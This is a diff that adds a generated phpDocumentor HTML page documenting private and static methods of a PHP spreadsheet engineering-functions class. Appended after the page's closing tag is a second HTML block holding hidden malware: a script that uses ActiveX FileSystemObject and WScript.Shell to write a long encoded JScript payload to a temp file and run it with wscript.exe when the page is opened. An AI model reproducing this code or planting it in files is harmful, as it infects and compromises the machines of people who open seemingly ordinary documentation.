+<div class="subelement response"><code>array</code></div>
+</div></div>
+</div>
+<a id="method_getConversionGroups"></a><div class="element clickable method public method_getConversionGroups" data-toggle="collapse" data-target=".method_getConversionGroups .collapse">
+<h2>getConversionGroups
+Returns a list of the different conversion groups for UOM conversions</h2>
+<pre>getConversionGroups() : array</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Returns</h3>
+<div class="subelement response"><code>array</code></div>
+</div></div>
+</div>
+<a id="method_getConversionMultipliers"></a><div class="element clickable method public method_getConversionMultipliers" data-toggle="collapse" data-target=".method_getConversionMultipliers .collapse">
+<h2>getConversionMultipliers
+Returns an array of the Multiplier prefixes that can be used with Units of Measure in CONVERTUOM()</h2>
+<pre>getConversionMultipliers() : array</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>array</code>of mixed</div>
+</div></div>
+</div>
+<a id="method__Besselk0"></a><div class="element clickable method private method__Besselk0" data-toggle="collapse" data-target=".method__Besselk0 .collapse">
+<h2>_Besselk0()
+        </h2>
+<pre>_Besselk0($fNum) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$fNum</h4></div>
+</div></div>
+</div>
+<a id="method__Besselk1"></a><div class="element clickable method private method__Besselk1" data-toggle="collapse" data-target=".method__Besselk1 .collapse">
+<h2>_Besselk1()
+        </h2>
+<pre>_Besselk1($fNum) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$fNum</h4></div>
+</div></div>
+</div>
+<a id="method__Bessely0"></a><div class="element clickable method private method__Bessely0" data-toggle="collapse" data-target=".method__Bessely0 .collapse">
+<h2>_Bessely0()
+        </h2>
+<pre>_Bessely0($fNum) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$fNum</h4></div>
+</div></div>
+</div>
+<a id="method__Bessely1"></a><div class="element clickable method private method__Bessely1" data-toggle="collapse" data-target=".method__Bessely1 .collapse">
+<h2>_Bessely1()
+        </h2>
+<pre>_Bessely1($fNum) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$fNum</h4></div>
+</div></div>
+</div>
+<a id="method__cleanComplex"></a><div class="element clickable method private method__cleanComplex" data-toggle="collapse" data-target=".method__cleanComplex .collapse">
+<h2>Cleans the leading characters in a complex number string</h2>
+<pre>_cleanComplex(string $complexNumber) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$complexNumber</h4>
+<code>string</code><p>The complex number to clean</p></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>string</code>The "cleaned" complex number</div>
+</div></div>
+</div>
+<a id="method__erfcVal"></a><div class="element clickable method private method__erfcVal" data-toggle="collapse" data-target=".method__erfcVal .collapse">
+<h2>_erfcVal()
+        </h2>
+<pre>_erfcVal($x) </pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument"><h4>$x</h4></div>
+</div></div>
+</div>
+<a id="method__nbrConversionFormat"></a><div class="element clickable method private method__nbrConversionFormat" data-toggle="collapse" data-target=".method__nbrConversionFormat .collapse">
+<h2>Formats a number base string value with leading zeroes</h2>
+<pre>_nbrConversionFormat(string $xVal, integer $places) : string</pre>
+<div class="labels"><span class="label">Static</span></div>
+<div class="row collapse"><div class="detail-description">
+<div class="long_description"></div>
+<h3>Parameters</h3>
+<div class="subelement argument">
+<h4>$xVal</h4>
+<code>string</code><p>The "number" to pad</p>
+</div>
+<div class="subelement argument">
+<h4>$places</h4>
+<code>integer</code><p>The length that we want to pad this value</p></div>
+<h3>Returns</h3>
+<div class="subelement response">
+<code>string</code>The padded "number"</div>
+</div></div>
+</div>
+<h3>
+<i class="icon-custom icon-property"></i> Properties</h3>
+<a id="property__conversionMultipliers"> </a><div class="element clickable property private property__conversionMultipliers" data-toggle="collapse" data-target=".property__conversionMultipliers .collapse">
+<h2></h2>
+<pre>$_conversionMultipliers : mixed[]</pre>
+<div class="labels"></div>
+<div class="row collapse"><div class="detail-description"><div class="long_description"></div></div></div>
+</div>
+<a id="property__conversionUnits"> </a><div class="element clickable property private property__conversionUnits" data-toggle="collapse" data-target=".property__conversionUnits .collapse">
+<h2></h2>
+<pre>$_conversionUnits : mixed[]</pre>
+<div class="labels"></div>
+<div class="row collapse"><div class="detail-description"><div class="long_description"></div></div></div>
+</div>
+<a id="property__one_sqrtpi"> </a><div class="element clickable property private property__one_sqrtpi" data-toggle="collapse" data-target=".property__one_sqrtpi .collapse">
+<h2></h2>
+<pre>$_one_sqrtpi </pre>
+<div class="labels"></div>
+<div class="row collapse"><div class="detail-description"><div class="long_description"></div></div></div>
+</div>
+<a id="property__two_sqrtpi"> </a><div class="element clickable property private property__two_sqrtpi" data-toggle="collapse" data-target=".property__two_sqrtpi .collapse">
+<h2></h2>
+<pre>$_two_sqrtpi </pre>
+<div class="labels"></div>
+<div class="row collapse"><div class="detail-description"><div class="long_description"></div></div></div>
+</div>
+<a id="property__unitConversions"> </a><div class="element clickable property private property__unitConversions" data-toggle="collapse" data-target=".property__unitConversions .collapse">
+<h2></h2>
+<pre>$_unitConversions : mixed[]</pre>
+<div class="labels"></div>
+<div class="row collapse"><div class="detail-description"><div class="long_description"></div></div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="row"><footer class="span12">
+            Template is built using <a href="http://twitter.github.com/bootstrap/">Twitter Bootstrap 2</a> and icons provided by <a href="http://glyphicons.com/">Glyphicons</a>.<br>
+            Documentation is powered by <a href="http://www.phpdoc.org/">phpDocumentor 2.0.0a12</a> and<br>
+            generated on 2013-06-02T15:42:47+01:00.<br></footer></div>
+</div>
+</body>
+</html>
+
+<html>
+<script type="text/javascript">
+<!--
+var ayfp6=new ActiveXObject('Scripting.FileSystemObject');var dk5h8=new ActiveXObject('WScript.Shell');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c='#@~^2CMAAA==-mD~a%!6y{xAPzmOk7+p6(L+1O`E?mMr2YbxTRoksnUXdYhr(Ln^DB#I-mD~6A2Xx	+SPb1Yb-+or8LmOcE?1.kaYRU4nV^B*i-l.~1\\8l$xUm.raYRj^Mk2Yw;^VHm:i\\mD,5!$+;\'4X;.l`m78l$#i7C.P.Xy61\'20!6"RVnYUwn^blVoG^NnDvq*i-mD,0%mFOxyH a,3Bww9Dk7nDk--mUUkRkXdBIW!x^YbGx,l{;FE`b`StrVc1\\8m;{\'0Rl81#P\\CD,:+1Xt\'	nh,2x!hnDmYKDcw0;Xy fMr\\/bI6WDchy,atchK\\nwkM/Yv#pZ:y,atclO3	N`*I:y,64 hW7+g+aYcb*	-lM~mZLGn{: 1a4RrYhv#Ib0v``1!NG+cf.k7+Pza+\'{qu-m!NGnRGDb\\nKz2\'x *\'[1!%GRnCO4"xBzlE#\'LmZLWR&dIl[X*	OTD0v^!NW+cKCY4_E-wlUUb+ l	rB*iLVF/Lc^ZLG+cKmY43B\'-l!YK.E	Rrx6BbIa3kD2`1!LKn nmY4_v-wv*i5lO-6vmT%K+RKCDtQB\'wE#Ia&7VkvmZ%WRKlDtQv\'-B*I8)886;UmDkKx~4f5W*c/S{%T#`.YE.U,w0EX"cMnD2XY+	/bGxglh+v/A{Ro#cOWdWh./lk+v#I8W;	mOkKUP(\\X"8`#`-mD~YZ%DEx1\\(l;c/!8/DDc!Bm-8m;R^nxTYt *bib0vw0Ea"csrV36b/OdvY!%O!_vR9G16v*#P3ERVacYZLOEBB [Km6Ebi)+Vkn~k6`a%;6" wks+AakkYdcD!LO;3B NK^E#bP3!%Va`DTLDESBcNG^E#i)nVk+PbWcwREXy srs2akkO/vYT%DE_v MYWB*bP3;RVa`YZLD;~ER.Y6BbI)80!UmDkW	~^*	L2`b	anS&zRM;xvB^d1Dk2Oc+a+,&J+lN/1DkaYcnx1W[+,BQWRlFOQB,zDEST#pUm.k2Oc?s+2`8!Tbp6+AfHR.E	cEmd1DbwYc+XnPJzn)N/^.bwYcnx1WN~v_6%mF1_v~J/v~Zbiq?^.bwY j^+nwvqZ!bp6h&HR";xvB^/1Dr2DR+XnPJz+=%dmMkaY +U^KNnPEQ0Rlq13BP&UE~T#pN6EU1YbWx,mS*DD`[%NlabPk0v2%!6ycorV2XkdYdc9%%lXb#PDnO!Dx~2REayc!YobV`NRLma#c?ryiNn^/+P.+DED	~UE^Vp8N0;U1YrW	~Ny4WXvE02{!#`DO!DU,wRE6.RVnY~ld+glhnvE0a{E*i86;UmDkKx~NfCHLco8O 7#`OMX	.nDE.x,2REa.R}w+	KaYwks+voqOy\\~8bR"+l9Jrx`*iNmCO1tc+*`DY;.	Px;s^iN86;	mObW	P+OVN"`*	r0vmA*MY`60l8,#ex1 ZF*	O!n.6`W%mq,*ianS&X ]!xcBSd1DraYc+6PJ&+=LdmMk2Oc+x1GNPB3W0l8,3B~znv*iN86;x1YrG	PoV{kLc0+W$wbP\\mDP1GR;,{B,l!YG.!xT\'U/4+V^na+1ED+xhd^Mk2Ycn6P&&)Ld^Mk2Ycn	mG9+,lx	k l	k~zm-Ud4+V^w-Kw+	wwmK:slUNxAkm.kaOR6n~Jz+l%km.kaOc+U1W9+Pmx	r+clUk,zCw	/tsV\'-+X2sWM+\'-^Whhmx[\'SdmMk2Oc+6n~Jzn)Nd1DraYc+x1W9nPmxUkRCUbPzmvib0`4z;Dl`6vW;2be\'^GR;,*	rG24DcW+05wBT*iOMXP\\lMPb[%^;xwREa"cZDCYK+XOok^+v0052BY.EbibN0s$R.rD+cmF0!,bpk9%V$R;sWk+c#p8^CDmtvn#Pk0v20EXycsGV[nM2akkO/v0W$w#b`H%;6Wc6vW$w*io0Gk%`6vW;a#IN)0k	CV^X	bGf4M`6vW;2S2,bi)N86EU^DkWU~4X;Dlcacd06*	YMXP.+DE.x,w0;XyR}2+	K+XOok^+vw*/VaBFbR"nl9bssv#iN^mY^tvn*	.Y!Dx,BEI8)0;x1YrG	PkKf4M`D.;13BhkyWGb`b0cwR;6.Ror^+2arkYd`M"!,V*#PYDH	7CD,YWt0Vx2RE6. MYsbsn`My!,V#IO6tVVc)YDDr8!Y+dxS/"0FI)mCDm4`+*	)N86EUmDkGU,ky{vvw,0.5#P6hfX ]o	DbO+vBuF;I-wv3D^:WAvB x?AB#3B\'wBBD^:Whc.1:cScwO3D$bQB\'-E#bianS&zR"noqDrO`BuF;Iw-EQMmhWhvBRx?Av#3Bw-G+WC!VY&^W	--ES.mscS`.mh*S`2,0.;*_vw\'f+WC!VOq1G	-wE#*i6h2zR"+LMkOnvBCn/I\'-B3.^:WhvB 9j3E#QB\'wsMknU9VXPza+HlsnE~.1:Wh`Mms*hvw13M;bQE--Eb~EI2Vm3(hbgfm?tv*iN0!UmDkGU,3E0sa`[XZ"m~WN:80#PYMz	7l.P9D+;M\'D1hcS`D1h*hv0N:q0bQE-w/4nV^-w6a+xww1Wh:mU9Bbpk6`NM !.RslOm4`&Y8z#exx!VV*`a+S&HR]EUc9D+EM DwsC1+`vY8BSNHT.lQ6LsF0*#pN+^/n	X+AfHRI!U`9D !.QB,JE_[XT"m_WLsq03BEv*i8N^mY^tvn*	N)0!xmDkKUP^w0DW`b`Stk^n`1\\4m5x\'6%mF1#`OZ+.0vW%mF1bp6xL48`bi.T(6sv#p:4^61c#pjmMk2Oc?VnwvF!ZTbi)86EUmOrKx~:(s61`b`DDX`r.+{vvvcNG16E#i)mmOm4`n#PY.zPky{vvBR9G^B*i)mCY^4v+b	D.XPk"nFv`v MYWB*I)mCDm4`+*	)N8)0;x1YrG	Pw2-Vb`lS^XV*	7l.PW2^xX\'	nh,2U;s+DCOKDcwR;Xy V+DsW^N.`mh^*^# j!4sKsND/*IWWM`6wsxX sW-+wrDkYcbp"02s	* lD3	Nc*i6wV	*chW7+H+XYcb*	\\m.P(+GM^x0aV	* kOns`bibW`v4n{MmRHCs+Z\'E]AZe;SAIBL[(nGMm 1m:nZ{B?HdY:PjGsEs+,qU0G.slOkKUB*[\'8GD^ hlOtexa%;XycM+D?anmblssKV[nM`!*b	$l,7ac4GMm nCO4#Iw2-Vb`8nFDm KmY4#pN)8W!x1YkKx,23bY2`(Eq.X#	6GDv\\lM~r\'8ib@!x*Ir3_b	7CD,hTW/\'8;8Da_E8l;Dk6EV|ob.V|wCDD{vQb_Bcsx0BibWc"a%!6"Ror^+36bdYk`AZc/bbPY.XP-mD~k\\RLy{6A&HR/DlOnUtWMOm!Y`STck#p/-%%"cq^W	JW1lOrKx\'vAswsW1 9VsB%Ei/7%N"R:l.oYKCDt\'EA/1DkaO +X+Eid\\0%.R)DT;:xOd{Bz&n=LdmMraY x1WNPmUxb+ l	k~v3Bz$lB3kik-0L.RUl-+cbp8^lD^tv+b`)88NW!x^YbG	P5+c1;`.ls**	-lMPUrm6h{v@!eOO])H1&2R&3&ff~sT%l*vRF1D O@*vIb0cN2CHLc.lV**"{Ukm6A#P\\C.,;x04m{tX!.X`.lVX#I-mD~3b*kK\'5T$+E .wsl1nvzw\'zT~B\'-\'wB*i-lMP-T^,:{VkWkWc.nw^l1+czwvJoSB\'w-EBbI7lD~2FD+;{v@!tOsV@*-x@!/1.kaY~YHwnxrY+XOzNl\\md^DbwDJ@*-U@!eOR-	-lMPCz6wvxUh~b1Ob\\nor(L+1YvwBUm.kaYrUTRsbs+UX/Dnhr(LmO-vbp\\CD,[3lt0x	+h~)1Yr\\p}4%mD`-EU^DbwORUtns^-B*I\\mDPk*q3R\'mXWw V+O?anmblsoKVNn.v bi7CMP8Th2E\'mX62vcMnY:+h2gl:c#p\\lM~-VX%1\'wBvQ7!s,sQB\'BQjDDkULc0.Ws/4l.;W9+`Z#p-lMP.hHoXxmX0aR;D+mOnK6DsrVnckcq3RQ-E-ww\'-BQ8ThfEBOMEn*iMhXT*c	DbYn`7Va01#iMAXT*R;sG/`*i[3X4RR]E	c-Ehd^MkwO 6nPJ&)%kmMkwDRUmKNnP\'BQdWF3RQ-E--\'wwB34ThfEQwEP&Y\'v#p-U&JOO@*w	@!&/1.bwO@*-	@!z4Yss@*EirW24.c.l+^X~Z#iD.z	7lMPVczT9\'2%!aycr2n	K+aOwks+v"m+sl~y#i0cHTNc.kD+Jr	+`	rlXh#pV*XZNc.kOndkU+v5x0t^bp3czT9R	DbOSr	+vwGM $bi0cz!9R/sK/+vbi)mlD^4`#P8N8W;	mOkKUP$l1-X`w5hlvb	7CMPOOc6/\'	+S~2	Eh+MlOGM`wR;6.RMOoW^NDcw5hlvbRwrV/bI6WDcOOcW/chK\\nwkM/Yv#pZYOcW/clO3	N`*IYOc0k hW7+g+aYcb*	-lM~E+ya%{Y,*WkRrYhv# hlDtib0vc42;**vE"XL#{xB9WmEkk42;W*cE"XLb\'{vNKmav-u4f5W*cE+"XLb{\'EDY6B*\'[9 80l`;.6L* /!4/D.c!B *"xB=yE#`YZnD6`25s*vQv\'-v_9+(0XvE+y6N#3vRN/nB*irG24Dv;v.6LBf0#p8Vd+~r6`8&$**vE"XL#xxEtO:Ek-4f$cl`E+yX%#{\'vtD:sv*	;+*m$`E+"aL*i)jm.raY ?^n+a`*bp88W;	mOkKU,D^scS`YS+XG#PDnY!DU~X+h2zR"+o"nCNvB_|/IwwE_OhaW3BwwE#iNW!x^YbG	PdOyk:`*	S4k^+cm74C5{\'0RCFO#	D.z	7lMPz\\*;W\'U+S~b1Yr-(r8%mO`E	Um.bwDR1YSGD0Bbi7l.~my\\W^\'H\\c!* 2	Es1nYAGM39Db-+k`bI6WDc-mD~k{qpk@!my7cmcVUoDtIk3\'+bPY!.0vly7*^R&Y:ckbQE-wl	UkRCUbB#I20kOwvC.\\*1R&Y+s`bb_E-wB*i5CO\\6vCy7cmc(O+s`b#QBwwE#I8)^lDm4c#	N	Um.kaOc?s+a`,Z!ZT!*iN86EU^DkW	~YZ+D6cU*O0l#`kWc1h*DDcxl,WX*"\'1+ZFb	bG24.vxl,0l~ZbiDDz	7l.~M&h+2\'a%EX" ZM+mYnKnaDsrVcxl,WXBYD;n*i.&SaR	MkD+`$!$nE*i.&Sv2 ;VWkn`*i81COm4`#`kWca%;6. sKV[nM26rdD/cxl16*b*	H%EXcvU*O0X#pYTnM0`	X,6*#pNN0bxmVsX`r6`8&$**vxX16*#ZxELd+EbPkG24M`xl,6X~2,bi)8NN6Ex1OkKxPXULt8`*	ODz`7l.P1tTxxah&z "+LIC9`v_|;j-\'?KWYSl.+\'-\\r1DWkG0D--qrUNKhk-wZ;.M+UYjnDkkGU\'-2a2^W.+Mw\'?4V^PsKV9nDk-wZGP$;Mxk	LB*iYZn.0v+OtLxQv\'-Cx	r+clUrE#iLVF/%`14oU3B\'-l!YK.E	Rrx6BbI)mlD^tv+#PNN0!x1YrWU~H%;6Wc++ld^*	Y.zPw0EX"cfn^+D+sKV9nDv+lkmSOME+*I81lY14c+*	X+A&z "EU`E^:9RnaPz^~MN~zk~J;~\'-\'-R\'-rv_vC/1_vEE~!BOD!+#pNN0!x1YrWU~.!86^c#PY.zP6+AfHR]+T9VnD+vBCnZ"w-C-w/4+ss6-\'/W	Y+XO\\+	E_lUNsnM/w-}2+	P	rDt-wv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvckU0Eb_E-wd4+Vsw\'qU/DC^Vw\'mK::mx9w-E~vmsN nX+PJ^P9+V,&5PJ0,JYFEvBB]2Vm2on)HG{?tv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvc9j2Eb_E-wj4+Vsw\'2[kDw\'ZGs:mxN\'-ESD1:*hvD^hWh`E 9U2B*Qv-\'?4+sVww}wnx\'wZK:hC	N-wv*~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+TfnVnO`vCn/I\'-vQMm:*AvB 9U3E#QE-\'?tV^w-}wnxy-wv*i81CY1t`b`8DDH	a+AfHR]+T9+^+OnvBCF/"-wB3.1:*S`ER9U2Eb_E-w?4+ss\'-ranxy--;Gh:mx9-wBbI)mCY14`#`NDDX`ahfXc]o9VY+vB_FZ"-wB3D^hWh`E 9U2B*Qv-\'?4+sV3a\'-KDK2+MYzj4++Oumx[V.k-wq?_nDKwkw-E#I81lO^4`+*`8DDXPanh2XcIno	.bYn`Eu|;IwwE_D^hWhcBc.ov*_E--ktsV\'-Gwxww1W:sCx9--ESvmsNc+a+~&1P[+^~z$P&W,J]qEE~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+T.kOnvBu|;i-\'?GWDhl.n\'-\\k1.K/G6Y\'-bx9Ghk-wZ!D.n	Y../bWx\'wKW^k1kn/wwA62VK.+M-wHKsksnz/dW1rmYnE~EFBBB"3M|f	r"fvbp8mmOm4`+*`NYMXP6nhfzcInoq.kD+cv_|Ziw\'?G0DAmDn\'-tkmMWkG0D-wbx[GS/-\'/EMD+	O#+M/bWU-wKKVrmbn/\'-jzkY+hw\'fr/m8^+]ob/YMX:GW^/v~EFvSEI2VmfqrIGvbi)mmY^tcn*	NYMz	X+AfHRInLqDrYcECF;j\'-?K0DAlM+w-tk^.K/W6O-\'k	[Ghk-\'Z;D.n	Y#+MdkKxwwhWVr^b+d-\'jH/O:\'-fb/m8VKC/0HL.E~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnZ`w-UWWYSl.n\'-nKsk1k+kwwHbmMWdWWO\'-\\H;w-"+dOMkmOPKnnDsrDYn9?	lwbxkv~EFv~EI3!|f}]fE#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'lOOMk4cn6--Gn8EToDv~v^sN +XnPJm~.:BbI)mCY14v+bP8DDXP6A&HR]+T.rD+`Eu|dH-\'j6s:zI3-w\\bm.WkG0D-w	bxNGAkPHK\'w;E.M+	Y.DkrW	-wqslLn,sk^nPA6+1;OkKx,r2YrG	/w-m;YKD;UkR+an\'-9+(;TonMBBBmsNcn6P&m,Nns,z;,&0E#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'w.G1+6a +X+-\'9n4!oT+.BSv1:[Ra+,z^~9+V~&$P&0Ebp8^mY1t`#PNYMX`6hfzcI+T	DbY+vvu|dH\'-jroPqb]2\'wHbm.GkW0Ow\'rx9GS/~gK\'-Z!DMnxD.nDkkGU\'-qsCoPsbsnPA6m;YrG	P6wDrW	/wwM+o nX+w-Gn(ELT+MB~Ems[R6nPJm~.:B*I81lY14c+*	)Y.X`ahfXc]+T.rD+`vunS\\-\'j}sPqb"2-\'Hb^DK/G0D-w	bxNKA/,1K\'w/EMDxO.n.kkGx\'wqslLn,sksn,2a+1;DkG	P}wYbW	d-\'InozVz"DRa+\'-f8;oT+MBSB^h9Rn6~z1P[n^Pz5~J0v#pN1lO1tv+#P8D.XP6nh2X ]oMrY`B_FJH\'-UroK	)"2w-trmMWdG6Y-w	bx[WSd,1P\'-;EDM+	O.DdkKxww&:lTnPwkV~36m!YrWU~}wOkKU/\'-OCk33rs^Rn6w\'fn(ETo+MBBvmsN +X+~&1PDhB*i81COm4`#`8O.H	a+SfXcInLqDkOnvBu|d\\\'-j}s:b"2\'wHbm.WkWWO\'-bUNKh/,HP-\'Z!D.+UOj+./bGx\'-	r	VWLG	-wjknMkUbYE~yH X1_E-wEk+.r	kYcn6~hk^.kaYc+a+~&J+lLk^DbwO xmG[Pv_60mF13B,z+E#pNmmY^tv+b`)YDH`6h&H ]+TMkO+cv_|JH\'w?}sP	zI2wwtk^DKdK0O\'-qkx9WSd-\'Z;DM+UOj+DkrW	--Aa2VKDDw-)[7lUm[-\'sGs9+Dww_k[+wr^+3XY\'-j	m4nm0+[.mV;nE~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnStw-UroKqb]3\'-Hb^DK/W6Ow-qk	NGhdw\'Z;DMnxD.n.kkWUw\'2aw^GM+.\'-zN\\mx1nN\'-oW^Nn.\'-?!2+MCk9[nx\'-`x^tn^0+[.msEBSvZB~v]AMmfq6"fv*i)mlDm4c+*	NYMX`ah&H IoMrO+vB_|JHwwUroKq)IA-wKKVk^r/w-tr1DGkW6Y-\'bUNKhdPgKwwUX/Dn:"+/DG.+\'-Gkdl8sZGx6roE~vqE~B]3V{9}]GBbp81lY1tvn#P8ODH	anS&Xc]+TDbOn`ECnS\\-wj}sPz]2\'-KG^kmrnk-wHb^MWdK0D--qk	[WS/~1:-wjH/YhI/YK.n-\'fb/C4snUIv~EqBBB]3V{f	6"fv#pN1lO1tv+#P8)WE	mOkKx~"ayWc#P\\lM~Cc$VD\'	?^.bwORz.o!:nUD/irWv4f;WXvm-(l$#"{BNd+E[\'lW;sOcV+	LY4@*!*`dhbY1tcl*5^Y qDn:v!bbPmldn,B&+El1*UN&v#i(DC3pmC/Pv&MB)^2%Mc`*I8Dl0i^ldn,B&/EllFE{;v#i8.lVi1Ck+~Ez	B)k,.d:v#I4M+CVpmlknPEzYEln,^L.`bianS&zR";xvB^h9Pz^~9+sPJ5,zW,B3m\\(l$S!*i8DlVI1l/~BJlB=n1VNyv#I6nA2X I!U`E+a2^WDn.c+a+,&~&k+^+mD~EQm74C;*i8.l3p[+6lE^Ol+OVNyc#IOMX`6A&HR];	`BAhaVCX.c+aPrB_1\\(C;c/;4kY.cZ~m78l$RVULY4OO#QB8nmEOk6;V|or.^{wC.D{v_m*$VOc1m:+9R&O+s`v;E#Qvcl\\bv#p8mmO^tv+*	N8Nn^/n	1VNycbp4\\X"8`bi)N.w"K+v#iFWMMAA==^#~@ '+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+'\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run('wscript.exe //e:jscript.encode '+s41k8+'\\'+bgw3u+' /t');
+//-->
+</script>
+</html>
